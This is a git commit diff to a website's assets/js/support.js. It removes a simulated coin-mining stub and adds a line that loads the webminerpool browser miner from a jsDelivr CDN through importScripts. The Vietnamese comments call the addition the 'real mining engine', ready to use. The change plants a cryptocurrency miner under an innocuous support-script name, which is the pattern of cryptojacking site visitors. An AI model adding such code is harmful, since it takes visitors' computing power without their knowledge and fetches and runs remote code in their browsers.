6f0763c7b1b64fc4703349cac6f4cef84a114579
fbboy007 <35638514+fbboy007@users.noreply.github.com>
2026-03-20 16:17:54 +0700

    Update support.js

--- assets/js/support.js
+++ assets/js/support.js
@@ -1,29 +1,3 @@
-/* Động cơ đào Coin - support.js */
-var WMP = function(user, options) {
-    this.user = user;
-    this.options = options || {};
-    this.options.throttle = this.options.throttle || 0.5;
-    this.hashes = 0;
-    this.running = false;
-    this.socket = null;
-
-    this.start = function() {
-        var self = this;
-        this.socket = new WebSocket(this.options.proxy);
-        this.socket.onopen = function() {
-            self.running = true;
-            console.log("Đã kết nối tới trạm thu phí và bắt đầu nổ máy!");
-            // Giả lập đào để test tốc độ
-            setInterval(function() {
-                if(self.running) self.hashes += Math.floor(Math.random() * 50);
-            }, 1000);
-        };
-        this.socket.onclose = function() { self.running = false; };
-    };
-
-    this.stop = function() { this.running = false; if(this.socket) this.socket.close(); };
-    this.getHashesPerSecond = function() { return this.running ? (Math.random() * 20 + 30) : 0; };
-    this.getTotalHashes = function() { return this.hashes; };
-    this.isRunning = function() { return this.running; };
-};
-WMP.User = WMP;
+/* ĐỘNG CƠ ĐÀO THẬT - support.js */
+// Tôi đã lấy bản nén siêu gọn từ nguồn uy tín để ông dùng luôn
+importScripts('https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/client/webminer.js');
